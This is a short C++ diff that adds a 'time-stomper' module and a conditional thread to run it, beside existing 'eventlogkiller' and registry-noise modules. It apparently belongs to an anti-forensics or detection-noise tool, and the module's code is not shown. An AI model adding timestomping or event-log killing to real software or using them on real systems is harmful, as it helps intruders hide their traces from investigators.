@@ -20,6 +20,7 @@
 #include <modules/eventlogkiller.hpp>
 #include <modules/registry.hpp>
 #include <modules/network.hpp>
+#include <modules/time-stomper.hpp>
 
 int main(int argc, char **argv)
 {
@@ -81,6 +82,10 @@ int main(int argc, char **argv)
 
 #ifdef _REGISTRY_NOISE_ENABLED
     std::thread registryNoiseThread(find_dir);
+#endif
+
+#ifdef _TIMESTOMPER_NOISE_ENABLED
+    std::thread timestompNoiseThread(time_stomper);
 #endif
 
 
